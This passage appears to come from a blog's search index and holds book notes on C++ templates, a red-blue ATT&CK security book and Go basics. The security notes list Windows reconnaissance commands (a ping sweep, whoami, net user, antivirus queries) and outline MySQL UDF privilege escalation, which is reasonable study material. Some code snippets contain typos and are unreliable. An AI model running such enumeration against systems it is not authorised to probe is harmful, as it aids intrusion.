compile-time error if undeclared(T) unknown static_assert(sizeof(int) &gt; 10, // always fails if sizeof(int)&lt;=10 &quot;int too small&quot;); static_assert(sizeof(T) &gt; 10, //fails if instantiated for T with size &lt;=10 &quot;T too small&quot;);&#125; 1.2 - Template Arugment DeductionAutomatic type conversions are limited during type deduction: When declaring call parameters by reference, even trivial conversions do not apply to type deduction. Two arguments declared with the same template parameter T must match exactly. When declaring call parameters by value, only trivial conversions that decay are supported: Qualifications with const or volatile are ignored, references convert to the referenced type, and raw arrays or functions convert to the corresponding pointer type. 12345678910template&lt;typename T&gt;T max (T a, T b);… int const c = 42;max(i, c); // OK: T is deduced as intmax(c, c); // OK: T is deduced as intint&amp; ir = i;max(i, ir); // OK: T is deduced as intint arr[4];foo(&amp;i, arr); // OK: T is deduced as int* 123max(4, 7.2); //ERROR: T can be deduced as int or doublestd::string s;foo(&quot;Hello&quot;, s); //ERROR: T can be deduced as char const[6] or std::string There are three ways to handle such errors: Cast the arguments so that they both match:1max(static_cast&lt;double&gt;(4), 7.2); Specify(or qualify) explicity the type of T to prevent the compiler from attempting type deduction:1max&lt;double&gt;(4, 7.2); Specify that the parameters may have different types. Type Deduction for Default Arguments12345template&lt;typename T&gt;void f(T = &quot;&quot;);f(1); //OK: deduced T to be int, so that it calls f&lt;int&gt;(1)f(); //ERROR: cannot deduce TTo support this case:12345template&lt;typename T = std::string&gt;void f(T = &quot;&quot;);...f(); //OK Important: Template argument deduction is performed before default arguments are considered. 1.3 - Multiple Template Parameters1234567template&lt;typename T1, typename T2&gt;T1 max (T1 a, T2 b)&#123; return b &lt; a ? a : b; &#125;… auto m = ::max(4, 7.2); // OK, but type of first argument defines return type Template Parameters for Return Types12template&lt;typename T1, typename T2, typename RT&gt;RT max (T1 a, T2 b); However, template argument deduction does not take return types into account, and RT does not appear in the types of the function call parameters. Therefore, RT cannot be deduced. 1234template&lt;typename T1, typename T2, typename RT&gt;RT max (T1 a, T2 b);…::max&lt;int,double,double&gt;(4, 7.2); // OK, but tedious 1234template&lt;typename RT, typename T1, typename T2&gt;RT max (T1 a, T2 b);…::max&lt;double&gt;(4, 7.2) //OK: return type is double, T1 and T2 are deduced Deducing the Return TypeSince C++14, this is possible by simply not declaring any return type(you still have to declare the return type to be auto):12345template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b)&#123; return b &lt; a ? a : b;&#125; Before C++14, it is only possible to let the compiler determine the return type by more or less making the implementation of the function part of its declaration. In C++11 we can benefit from the fact that the trailing return type syntax allows us to use the call parameters. That is, we can declare that the return type is derived from what operator?: yields:12345template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b) -&gt; decltype(b &lt; a ? a : b)&#123; return b &lt; a ? a : b;&#125;12template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b) -&gt; decltype(b&lt;a?:a:b);123456#include &lt;type_traits&gt;template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b) -&gt; typename std::decay&lt;decltype(true ? a : b)&gt;::type&#123; return b &lt; a ? a : b;&#125; 1.4 - Default Template ArgumentsYou can also define values for template parameters. These values are called default template arguments and can be used with any kind of template. 123456#include &lt;type_traits&gt;template&lt;typename T1, typename T2, typename RT = std::decay_t&lt;decltype(trye ? T1() : T2())&gt;&gt;RT max(T1 a, T2 b)&#123; return b &lt; a ? a : b;&#125; Note again the usage of std::decay_t&lt;&gt; to ensure that no reference cna be returned. Note also that this implementation requires that we are able to call default constructors for the passed types. There is another solution, using std::declval, which, however, make the declaration even more complicated(Section 11.2.3) We can also use the std::common_type&lt;&gt; type trait to specify the default value for the return type:12345678910#include &lt;type_traits&gt;template&lt;typename T1, typename T2, typename RT = std::common_type_t&lt;T1, T2&gt;&gt;RT max(T1 a, T2 b)&#123; return b &lt; a ? a : b;&#125;auto a = ::max(4, 7.2);auto b = ::max&lt;double, int, long double&gt;(7.2, 4);However, again we have the problem that we have to specify three types to be able to specify the return type only. We would need the ability to have the return type as the first template parameter, while still begin able to deduce it from the argument types. It is possible to have default arguments for leading function template parameters even if parameters without default arguments follow:1234567891011template&lt;typename RT = long, typename T1, typename T2&gt;RT max(T1 a, T2 b)&#123; return b &lt; a ? a : b;&#125;int i;long l;...max(i, l); //returns long(default argument of template parameter for returns type).max&lt;int&gt;(4, 42); //returns int as explicitly requested 1.5 - Overloading Function TemplatesLike ordinary functions, function templates can be overloaded. That is, you can have different function difinitions with the same function name so that when that name is used in a function call, a C++ compiler must decide which one of the various candidates to call. 12345678910111213141516171819202122//maximum of two int values:int max(int a, int b)&#123; return b &lt; a ? a : b;&#125;//maximum of two values of any type:template&lt;typename T&gt;T max(T a, T b)&#123; return b &lt; a ? a : b;&#125;int main()&#123; ::max(7, 42); // calls the nontemplate for two ints ::max(7.0, 42.0); // calls max&lt;double&gt; (by argument deduction) ::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls max&lt;char&gt; (by argument deduction) ::max&lt;&gt;(7, 42); // calls max&lt;int&gt; (by argument deduction) ::max&lt;double&gt;(7, 42); // calls max&lt;double&gt; (no argument deduction) ::max(&#x27;a&#x27;, 42.7); // calls the nontemplate for two ints&#125; If the template can generate a function with a better match, however, then the template is selected.12::max(7.0, 42.0); // calls the max&lt;double&gt; (by argument deduction)::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls the max&lt;char&gt; (by argument deduction)Here, the template is a better match because no conversion from double or char to int is required. 1::max(&#x27;a&#x27;, 42.7); Because automatic type conversion is not considered for deduced template parameters but is considered for ordinary function parameters, the last call uses the nontemplate function(while a and 42.7 both converted to int). 12345678910template&lt;typename T1, typename T2&gt;auto max (T1 a, T2 b)&#123; return b &lt; a ? a : b;&#125;template&lt;typename RT, typename T1, typename T2&gt;RT max (T1 a, T2 b)&#123; return b &lt; a ? a : b;&#125; New, we can call max():123auto a = ::max(4, 7.2); //uses first template.auto b = ::max&lt;long double&gt;(7.2, 4); //uses second template, since the number of parameters is not matched for first template.auto c = ::max&lt;int&gt;(4, 7.2); //ERROR: both function templates match. A useful example would be to overload the maximum template for pointers and ordinary C-strings:1234567891011121314151617181920212223242526272829303132333435363738#include &lt;cstring&gt;#include &lt;string&gt;//maximum of two values of any type:template&lt;typename T&gt;T max(T a, T b)&#123; return b &lt; a ? a : bl&#125;//maximum of two pointers:template&lt;typename T&gt;T* max(T *a, T *b)&#123; return *b &lt; *a ? a : b;&#125;//maximum of two C-strings:char const* max(char const* a, char const* b)&#123; return std::strcmp(b, a) &lt; 0 ? a : b;&#125;int main()&#123; int a = 7; int b = 42; auto m1 = ::max(a,b); // max() for two values of type int std::string s1 = &quot;hey&quot;; std::string s2 = &quot;you&quot;; auto m2 = ::max(s1,s2); // max() for two values of type std::string int* p1 = &amp;b; int* p2 = &amp;a; auto m3 = ::max(p1,p2); // max() for two pointers char const* x = &quot;hello&quot;; char const* y = &quot;world&quot;; auto m4 = ::max(x,y); // max() for two C-strings&#125;Note that in all overloads of max() we pass the arguments by value. In general, it is good idea not to change more than necessary when overloading function templates. You should limit your changes to the number of parameters or to specifying template parameters explicitly. Otherwise, unexpected effects may happen. 123456789101112131415161718192021222324252627#include &lt;iostream&gt;template&lt;typename T&gt;T max(T a, T b)&#123; std::cout &lt;&lt; &quot;max&lt;&gt;()&quot; &lt;&lt; endl; return b &lt; a ? a : b;&#125;// maximum of three values of any type:template&lt;typename T&gt;T max (T a, T b, T c)&#123; return max (max(a,b), c); // uses the template version even for ints&#125; // because the following declaration comes // too late:// maximum of two int values:int max (int a, int b)&#123; std::cout &lt;&lt; &quot;max(int,int) \\n&quot;; return b &lt; a ? a : b;&#125;int main()&#123; ::max(47,11,33); // OOPS: uses max&lt;T&gt;() instead of max(int,int)&#125; 1.6 - But, Shouldn’t We…?Pass by Value or by Reference?Why not inline?In general, function templates don’t have to be declared with inline. Unlike ordinary.The only exception to this rule are full specializations of templates for specific types, so that the resulting code is no longer generic (all template parameters are defined). Why not constexpr?Since C++11, you can use constexpr to provide the ability to use code to compute some values at compile time. For a lost of templates this makes sense. For example, to be able to use the maximum function at compile time, you have to declare it as follows:12345template&lt;typename T1, typename T2&gt;constexpr auto max(T1 a, T2 b)&#123; return b &lt; a ? a : b;&#125;With this, you can use the maximum function template in places with compile-time context, such as when declaring the size of a raw array:1int a[::max(sizeof(char), 1000u)];or the size of a std::array&lt;&gt;:1std::array&lt;std::string, ::max(sizeof(char), 1000u)&gt; arr; Chapter.2 - Class Template2.1 - Implementation of Class Template Stack1234567891011121314151617181920212223242526272829303132333435363738394041424344//stack1.hpp#include &lt;vector&gt;#include &lt;cassert&gt;template&lt;typename T&gt;class Stack &#123;private: std::vecotr&lt;T&gt; elems; //elementspublic: void push(T const&amp; elem); //push element void pop(); //pop element T const&amp; top() const; //return top element bool empty() const &#123; //return whether the stack is empty. return elems.empty(); &#125;&#125;template&lt;typename T&gt;void Stack&lt;T&gt;::push (T const&amp; elem)&#123; elems.push_back(elem); //append copy of passed elem&#125;template&lt;typename T&gt;void Stack&lt;T&gt;::push (T const&amp; elem)&#123; elems.push_back(elem);&#125;template&lt;typename T&gt;void Stack&lt;T&gt;::pop()&#123; assert(!elems.empty()); elems.pop_back();&#125;template&lt;typename T&gt;T const&amp; Stack&lt;T&gt;::top() const&#123; assert(!elems.empty()); return elems.back();&#125; If, for example, you have to declare your own copy constructor and assignment operator, it typically looks like this:1234567template&lt;typename T&gt;class Stack &#123; ... Stack (Stack const&amp;); //copy constructor Stack&amp; operator= (Stack const&amp;); //assignment operator ...&#125;which is formally equivalent to:1234567template&lt;typename T&gt;class Stack &#123; ... Stack (Stack&lt;T&gt; const&amp;); Stack&lt;T&gt;&amp; operator= (Stack&lt;T&gt; const&amp;); ...&#125;but usually the &lt;T&gt; signals special handling of special template parameters, so it’s usually better to use the first form. However, outside the class structure you’d need:12template&lt;typename T&gt;bool operator== (Stack&lt;T&gt; const&amp; lhs, Stack&lt;T&gt; const&amp; rhs);Note that in place where the name and not type of the class is required, only Stack may be used. Implementation of Member FunctionsTo define a member function of a class template, you have o specify that it is a template, and you have to use the full type qualification of the class template. 12345template&lt;typename T&gt;void Stack&lt;T&gt;::push(T const&amp; elem)&#123; elems.push_back(elem); //append copy of passed elem.&#125; In this case, push_back() of the element vector is called, which appends the element at the end of the vector. Note that pop_back() of vector removes the last elemtn but does not return it.It is impossible to implement a completely exception-safe version of pop() that returns the removed. However, ignoring this danger, we could implement a pop() that returns the element just removed.123456789template&lt;typename T&gt;T Stack&lt;T&gt;::pop()&#123; assert(!elems.empty()); T elem = elems.back(); //save copy of last element. elems.pop_back(); //remove last element. return elem; //return copy of saved element.&#125; 2.2 - Use of Class Template Stack12345678910111213141516171819//stack1.cpp#include &quot;stack1.hpp:#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123; Stack&lt;int&gt; intStack; Stack&lt;std::string&gt; stringStack; //manipulate int stack intStack.push(7); std::cout &lt;&lt; intStack.top() &lt;&lt; &#x27;\\n&#x27;; //manipulate string stack stringStack.push(&quot;hello&quot;); std::cout &lt;&lt; stringStack.top() &lt;&lt; &#x27;\\n&#x27;; stringStack.pop();&#125; An instantiated class template’s type can be used just like any other type.123456void foo(Stack&lt;int&gt; const&amp; s) //parameter `s` is `int` stack.&#123; using IntStack = Stack&lt;int&gt;; //IntStack is another name for `Stack&lt;int&gt;`. Stack&lt;int&gt; istack[10]; //`istack` is an array of 10 `int` stacks. IntStack istack2[10]; //`istack2` is also an array of 10 `int` stacks (same type).&#125; Template arguments may be any type, such as pointers to float or even stack of int:12Stack&lt;float*&gt; flatPtrStack; //stack of `float` pointers.Stack&lt;Stack&lt;int&gt;&gt; intStackStack; //stack of stack of ints. Note that before C++11 you had to put whitespace between the two closing template brackets:1Stack&lt;Stack&lt;int&gt; &gt; intStackStack; // OK with all C++ versionsIf you didn’t do this, you were using operator &gt;&gt;, which resulted in a syntax error:1Stack&lt;Stack&lt;int&gt;&gt; intStackStack; // ERROR before C++11The reason for the old behavior was that it helped the first pass of a C++ compiler to tokenize thesource code independent of the semantics of the code 2.3 - Partial Usage of Class TemplatesInstead of print the stack contents with printOn it is better to implement operator&lt;&lt; for the stack. However, as usual operator&lt;&lt; has to be implemented as nonmember function, which then could call printOn() inline:123456789101112template&lt;typename T&gt;class Stack &#123; ... void printOn() (std::ostream&amp; strm) const &#123; ... &#125; friend std::ostream&amp; operator&lt;&lt; (std::ostream&amp; strm, Stack&lt;T&gt; const&amp; s) &#123; s.printOn(strm); return strm; &#125;&#125;; 2.4 - Friends2.5 - Specializations of Class TemplatesSpecializing class templates allows you to optimizeimplementations for certain types or to fix a misbehavior of certain types for an instantiation of the class template. If you specialize a class template, you must also specialize all member functions. Although it is possible to specialize a single member function of a class template, once you have done so, you can no longer specialize the whole class template instance that the specialized member belongs to. To specialize a class template, you have to declare the class with a leading template&lt;&gt; and a specification of the types for which the class template is specialized. The types are used as a template argument and must be specified directly following the name of the class:1234template&lt;&gt;class Stack&lt;std::string&gt; &#123; ...&#125;; For these specializations, any definition of a member function must be defined as an “ordinary” member function, which each occurence of T begin replaced by the specialized type:1234void Stack&lt;std::string&gt;::push (std::string const&amp; elem)&#123; elems.push_back(elem);&#125; 2.6 - Partial SpecializationClass templates can be partially specialized. You can provide special implementations for particular circumstances, but some template parameters must still be defined by the user. For example, we can define a special implementation of class `Stack&gt; for pointers:1234567891011121314151617181920212223242526272829303132333435363738#include &quot;stack1.hpp&quot;template&lt;typename T&gt;class Stack&lt;T*&gt; &#123;private: std::vector&lt;T*&gt; elems;public: void push(T*); T* pop(); T* top() const; bool empty() const &#123; return elems.empty(); &#125;&#125;template&lt;typename T&gt;void Stack&lt;T*&gt;::push (T* elem)&#123; elems.push_back(elem);&#125;template&lt;typename T&gt;T* Stack&lt;T*&gt;::pop()&#123; assert(!elems.empty()); T* p = elems.back(); elems.pop_back(); return p;&#125;template&lt;typename T&gt;T* Stack&lt;T*&gt;::top() const&#123; assert(!elems.empty()); return elems.back();&#125; 2.7 - Default Class Template Arguments2.8 - Type Aliases2.9 - Class Template Argument Deduction2.10 - Templatized AggregatesChapter.3 - Nontype Template Parameters","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"Programming","slug":"Programming","permalink":"https://iss4cf0ng.github.io/tags/Programming/"},{"name":"C++","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Coding","slug":"Coding","permalink":"https://iss4cf0ng.github.io/tags/Coding/"},{"name":"Program","slug":"Program","permalink":"https://iss4cf0ng.github.io/tags/Program/"},{"name":"Templates","slug":"Templates","permalink":"https://iss4cf0ng.github.io/tags/Templates/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Practical Guide To Red-Blue Confrontation From ATT&CK","slug":"2026-1-5-RedBlueConfrontationFromAttCk","date":"2026-01-04T16:11:01.000Z","updated":"2026-01-15T09:20:57.491Z","comments":true,"path":"2026/01/05/2026-1-5-RedBlueConfrontationFromAttCk/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/05/2026-1-5-RedBlueConfrontationFromAttCk/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Practical Guide To Red-Blue Confrontation From ATT&amp;CK”.The content will be continuously updated as I read through the book. ReflectionThis book introduces many practical cybersecurity attack techniques from the perspective of the MITRE ATT&amp;CK framework. The majority of the content focuses on attack methods targeting the Windows platform, while Linux is also mentioned in several chapters. Compared to several books that I have read before (click this one, this one and this one), there are overlapping topics, and most of them primarily discuss Windows security. However, this book presents tool usage and penetration techniques in a more practical and broader manner. I believe this is a good book for strengthening your fundamental cybersecurity knowledge and skills, especially if you have already read the three books that I mentioned above. This book including: Windows Protocols Tunneling Proxy/Reverse Proxy Port Forwarding Lateral(Horizontal) Movement Many Many Tools Persistence Several well-known rootkits This book not including: The underlying principles of Windows Protocols. The deep, underlying principles of different methods, such as, port forwarding. The underlying principles of exploits. How to mastering Cobalt Strike. There are typo and several mistakes about Windows Protocols, reader should study them and do the double-check with the official documents. This book is suitable for readers who want a practical overview of offensive techniques rather than a deep understanding of underlying mechanisms. Chapter.1 - Fundamentals of Windows Security1.1 - Fundamentals of Windows Authentication SSPI SSP Well-Known SSP NTLM Kerberos Negotiate Security Channel Digest Authentication Cred SSP Distributed Password Authentication PKU2U 1.3 - Security Authentication Mechanism of WindowsNTLMKerberos Ports used by Kerberos: TCP/UDP 88: Authentication and Tickets TCP/UDP 464: Kerberos Kpaswd(Reset Password) protocol. LDAP: 389 LDAPS: 636 Terminology of Kerberos| Term | Meaning || —- | —- || AS | Authentication Service. || KDC | Key Distrubution Center. (Domain controller, the most important server in a domain). || TGT | Ticket Granting Ticket. || TGS | Ticket Granting Service. || ST | Service Ticket. || krbtgt | Every domain has account for krbtgt. || Principal | A unique identity to which Kerberos can assign tickets. || PAC | Privilege Attribute Certificate. || SPN | Servic Principal Name. || Session Key | A temporary key. || Server Session Key | A temporary key. || Authenticator | Encryted with Session Key. || Replay Cache | It has added since Kerberos 5. | An Overview of Kerberos Authentication Client demonstrates it has the correct password by encrypting timestamp with its NTLM hash. This process is also know as pre-authentication. After successful pre-authentication, the client requests a TGT (Ticket Granting Ticket) from the Authentication Server (AS), which is typically a DC (Domain Controller). The client presents its TGT to TGS (Ticket Granting Server) to request access to a specific service. If the TGT is valid, the client receives a ST (Service Ticket) from the KDC’s TGS. Client is allowed to access the service on the target server if both the ST and the service authentication are valid Details of Kerberos Authentication AS-REQ and AS-REP (Interaction between client and AS): AS-REQ:\\When a client wants to access resources within a domain, after the user enters a username and password, the client sends an AS-REQ message to the Authentication Server (AS).\\The request includes information such as the message type, protocol version, client principal name (username), and pre-authentication.\\To prove knowledge of the password, the client encrypts a timestamp using a key derived from the user’s NTLM hash. This encrypted timestamp is included as pre-authentication data.\\The AS decrypts the timestamp to verify the client’s credentials. If the verification succeeds, the AS responds with an AS-REP message containing a Ticket Granting Ticket (TGT). AS-REP: TGS-REQ and TGS-REP (Interaction between client and TGS): TGS-REQ: TGS-REP: AP-REQ and AP-REP (Interaction between client and server): AP-REQ: AP-REP: 1.4 - Windows ProtocolsLLMNRLLMNR (Link-Local Multicast Name Resolution) LLMNR Spoofing NetBIOSNetBIOS (Network Basic Input/Output System) WPADWPAD (Web Proxy Auto-Discovery) Protocol 1.5 - WMIWMI (Windows Management Instructmentation) is the essential of Windows XP/2000 system management. User can perform local or remote resource management. It supports DCOM (Distributed Component Object Model) and WinRM (Windows Remote Management). It is a useful tool for Win32 operating system. On the other hand, it is a useful tool for fileless attack. WQLWQL (WMI Query Language) is a SQL of WMI, it has a similar syntaxs to SQL. However, WQL can only be used for data query, it is not allowed to do creation, delete or modification to the instance of a class. Example of QueryingBasic usage:1SELECT properties[, properties] FROM class [where clause] 1&gt; wbemtest WMI Client PowerShell Get-WmiObject Get-CimAssociatedInstance Get-CimClass Get-CimInstance Get-CimSession Set-WmiInstance Set-CimInstance Invoke-WmiMethod Invoke-CimMethod New-CimInstance New-CimSession New-CimSessionOption Register-CimIndicationEvent Register-WmiEvent Remove-CimInstance Remove-WmiObject Remove-CimSession WBEMTEST WinRM Win explorer WSH WMI Remote Interactive DCOM:\\DCOM (Distributed Component Object Model) is a set of APIs based on COM, introduced by Microsoft. Before understanding DCOM, it is necessary to understand COM.\\COM (Component Object Model) is a standard defined by Microsoft that specifies how software components communicate with each other on the same machine. It allows a client to interact with a component directly, without the need for any intermediate component.\\DCOM is an extension of COM that enables clients to use COM objects not only locally but also remotely over a network. This functionality is implemented using RPC (Remote Procedure Call).\\DCOM enhances COM by providing support for distributed computing, multiple network protocols, and secure communication. WinRM WMI EventsAttacking WMI Information Extraction Computer/System Information: Win32_OperatingSystem, Win32_ComputerSystem File/Directory: CIM_DataFile Desk: Win32_Volume Registry: StdRegProv Process: Win32_Process Service: Win32_Service Event: Win32_NtLogEvent Logged Account: Win32_LoggedOnUser, Win32_LogonSession Sharing: Win32_Share Hotfix: Win32_QuickFixEngineering Network: Win32_IP4RouteTable User Account: Win32_UserAccount User Group: Win32_Group Anti-Virus1SELECT * FROM AntiVirusProduct Lateral Movement Chapter.2 - Information Extraction2.1 - Host EnumerationPing1&gt; for /l %i in (1,1,255) do @ping x.x.x.%i -w 1 -n 1 | find /i &quot;ttl&quot; ARP 1&gt; net use 1&gt; net session 1&gt; ipconfig /displaydns 2.2 - Information Extraction on WindowsUser’s Information and Privilege Command Description net user net localgroup administrators query user whoami /all whoami &amp;&amp; whomai /priv net localgroup System Information Command Description ipconfig /all wmic service list brief Network Information2.2 - Information Extraction on LinuxChapter.3 - TunnelingChapter.4 - Privilege EscalationWindows Privilege EscalationBad ConfigurationDLL HijackingPrivilege Escalation with 3rd Service MySQL UDF What is UDF How to do escalation 12mysql&gt; select @@plugin_dir;mysql&gt; show variables like, %plugin%; Chapter.5 - Credentials ExtractionChapter.6 - Lateral MovementChapter.7 - PersistenceThanks for reading!","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Linux","slug":"Linux","permalink":"https://iss4cf0ng.github.io/tags/Linux/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Hacking","slug":"Hacking","permalink":"https://iss4cf0ng.github.io/tags/Hacking/"},{"name":"Hack","slug":"Hack","permalink":"https://iss4cf0ng.github.io/tags/Hack/"},{"name":"Penetration","slug":"Penetration","permalink":"https://iss4cf0ng.github.io/tags/Penetration/"},{"name":"PrivilegeEscalation","slug":"PrivilegeEscalation","permalink":"https://iss4cf0ng.github.io/tags/PrivilegeEscalation/"},{"name":"Security","slug":"Security","permalink":"https://iss4cf0ng.github.io/tags/Security/"},{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"https://iss4cf0ng.github.io/tags/CyberSecurity/"},{"name":"ATT&CK","slug":"ATT-CK","permalink":"https://iss4cf0ng.github.io/tags/ATT-CK/"},{"name":"Pentesting","slug":"Pentesting","permalink":"https://iss4cf0ng.github.io/tags/Pentesting/"},{"name":"ActiveDirectory","slug":"ActiveDirectory","permalink":"https://iss4cf0ng.github.io/tags/ActiveDirectory/"},{"name":"Windows","slug":"Windows","permalink":"https://iss4cf0ng.github.io/tags/Windows/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Learning Go","slug":"2026-1-5-LearningGo","date":"2026-01-04T16:10:20.000Z","updated":"2026-02-22T05:06:58.307Z","comments":true,"path":"2026/01/05/2026-1-5-LearningGo/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/05/2026-1-5-LearningGo/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Learning Go”.The content will be continuously updated as I read through the book. Chapter.1 - Setting Up Your Go EnvironmentThe go command1234567package mainimport &quot;fmt&quot;func main() &#123; fmt.Println(&quot;Hello, world!&quot;)&#125; 1&gt; go run hello.go 1&gt; go build hello.go This creates an executable called hello (or hello.exe on Windows) in the current directory. MakefilesHere’s a sample Makefile to add to our very simple project:1234567891011121314151617.DEFAULT_GOAL := buildfmt: go fmt ./....PHONY:fmtlint: fmt golint ./....PHONY: lintvet: fmt go vet ./....PHONY:vetbuild: vetgo build hello.go.PHONY:buildEach possible operation is called a target. The .DEFAULT_GOAL defines which target is run when no target is specified. In our case, we are going to run the build target. The world before the colon (:) is the name of the target. Any words after the target (like vet in the line build: vet) are the other targets that must be run before the specified target runs. The taks that are performed by the target are on the indented lines after the target (The) Once theMakefile is in your directory, type:1&gt; make Chapter.2 - Primative Types and DeclarationsComplex Number12345func main() &#123; x := complex(2.5, 3.1) y := complex(10.2, 2) fmt.Println(x + y)&#125; var vs. :=1var x int = 10 1var x = 10 1var x int 1var x, y int = 10, 20 1var x, y int 1var x, y = 10, &quot;hello&quot; 1234567var ( x int y = 20 z int = 30 d, e, = 40, &quot;hello&quot; f, g string) 12var x = 10x := 10 12var x, y = 10, &quot;hello&quot;x, y := 10, &quot;hello&quot; 12x := 10x, y := 30, &quot;hello&quot; constCode:1234567891011121314151617181920const x int64 = 10const ( idKey = &quot;id&quot; nameKey = &quot;name&quot;)const z = 20 * 10func main() &#123; const y = &quot;hello&quot; fmt.Println(x) fmt.Println(y) x = x + 1 y = &quot;bye&quot; fmt.Println(x) fmt.Println(y)&#125;Output:1234./prog.go:21:2: cannot assign to x (neither addressable nor a map index expression)./prog.go:22:2: cannot assign to y (neither addressable nor a map index expression)Go build failed. Typed and Untyped ConstantUntyped constant:1const x = 10 All of the following assignments are legal:123var y int = xvar x float64 = xvar d byte = x Here’s what a typed constant declaration looks like:1const typedX int = 10This constant can only be assigned directly to an int. Assigning it to any other type produces a compile-time error. Unused Variables123456func main() &#123; x := 10 x = 20 fmt.Println(x) x = 30&#125; The Go compiler allows you to create unread constants with const. This is because constants in Go are calculated at compile time and cannot have any side effects. This makes them easy to eliminate: if a constant isn’t used, it is simply not included in the compiled binary. Naming Variables and Constants12345678910//Example 2-4. Variable names you should never use_0 := 0_0_𝟙 := 20π := 3 //piａ := &quot;hello&quot; //Full-width (Shift + Space)fmt.Println(_0)fmt.Println(_𝟙)fmt.Println(π)fmt.Println(ａ) asdWhile this code works DO NOT name your variable like this. Chapter.3 - Composite TypesArrays——Too Rigid to Use DirectlyArrays are rarely used directly in Go. All of the elements in the array must be of the type that’s specified (this doesn’t mean they are always of the same type). There are a few different declaration styles.1var x [3]int 1var x = [3]int&#123;10, 20, 30&#125; 123var x = [12]int&#123;1, 5: 4, 6, 10: 100, 15&#125;//This creates an array of 12 ints with the following values: [1, 0, 0, 0, 0, 4, 6, 0, 0, 0,100, 15]. When using an array literal to initialize an array, you can leave off the number and use ... instead:1var x = [...]int&#123;10, 20, 30&#125; You can use == and != to compare arrays:123var x = [...]int&#123;1, 2, 3&#125;var y = [3]int&#123;1, 2, 3&#125;fmt.Println(x == y) // prints true Go only has one-dimensional arrays, but you can simulate multidimensional arrays:1var x [2][3]intThis declares x to be an array of length 2 whose type is an array of ints of length 3. Note that you cannot read or write past the end of an array or use negative index. If you do this with a constant or literal index, it is a compile-time error. Finally, the built-in funciton len takes in an array and returns its length:1fmt.Println(len(x)) Go considers the size of the array to be part of the type of the array. This makes an array that’s declared to be [3]int a different type from an array that’s declared to be [4]int. This also means that you cannot use a variable to specify the size of an array, because types must be resolved at compile time, not at runtime. You cannot use a type conversion to convert arrays of different sizes to identical types. SlicesMost of the time, when you want a data structure that holds a sequence of values, a slice is what you should use. WHat makes slices so useful is that the length is not part of the type for a slice. 1var x = []int&#123;10, 20, 30&#125; Using [...] makes an array. Using [] makes a slice. 1var x = []int&#123;1, 5: 4, 6, 10: 100, 15&#125; You can simulate multidimensional slices and make a slice of slices:1var x [][]int 12x[0] = 10fmt.Println(x[2]) In Go, nil is an identifier that represents the lack of a value for some types. Like the untyped numeric constants we saw in the previous chapter,nil has no type, so it can be assigned or compared against values of different types. A nil slice contains nothing. A slice is the type that isn’t comparable. It is a compile-time error to use == to see if two slices are identical or != to see if they are different. The only thing you can compare a slice with is nil: 1fmt.Println(x == nil) appendThe built-in append function is used to grow slices12var x []intx = append(x, 10) The append function takes at least two parameters, a slice of any type and a value of that type. It returns a slice of the same type.12var x = []int&#123;1, 2, 3&#125;x = append(x, 4) You can append more than one value at a time:1x = append(x, 5, 6, 7) Capacity123456789101112var x[]intfmt.Println(x, len(x), cap(x))x = append(x, 10)fmt.Println(x, len(x), cap(x))x = append(x, 20)fmt.Println(x, len(x), cap(x))x = append(x, 30)fmt.Println(x, len(x), cap(x))x = append(x, 40)fmt.Println(x, len(x), cap(x))x = append(x, 50)fmt.Println(x, len(x), cap(x)) makeThis built-in make function allows us to create an empty slice that already has a length or capacity specified. It allows us to specify the type, length, and, optionally, he capacity.1x := make([]int, 5) 12x := make([]int, 5)x = append(x, 10) 1x := make([]int, 5, 10) You can also create a slice with zero length, but a capacity that’s greater than zero:1x := make([]int, 0, 10)In this case, we have a non-nil slice with a length of 0, but a capacity of 10. Since the length is 0, we can’t directly index into it, but we can append values to it:12x := make([]int, 0, 10)x = append(x, 5, 6, 7, 8)The value of x is now [5 6 7 8], with a length of 4 and a capacity of 10. Never specify a capacity that’s less than the length! It is a compil-time error to do so with a constant or numeric literal. If you use a variable to specify a capacity that’s smaller than the length, your program will panic at runtime. Declaring Yoyr Slice12//Example 3-2: Declaring a slice that might stay nilvar data []int You can create a slice using an empty slice literal:1var x = []int&#123;&#125; Declaring a slice with default values1data := []int&#123;2, 4, 6, 8&#125; //numbers we appreciate Slicing SlicesA slice expression creates a slice from a slice. It’s written inside brackets and consists of a starting offset and an ending offset, separated by a colon (:).12345678910x := []int&#123;1, 2, 3, 4&#125;y := x[:2]z := x[1:]d := x[1:3]e := x[:]fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y)fmt.Println(&quot;z:&quot;, z)fmt.Println(&quot;d:&quot;, d)fmt.Println(&quot;e:&quot;, e)Output:12345x: [1 2 3 4]y: [1 2]z: [2 3 4]d: [2 3]e: [1 2 3 4] When you take a slice from a slice, you are NOT making a copy of the data. Instead, you now have two variables that are sharing memory. This means that changes to an element in a slice affect al slices that share that element. 123456789x := []int&#123;1, 2, 3, 4&#125;y := 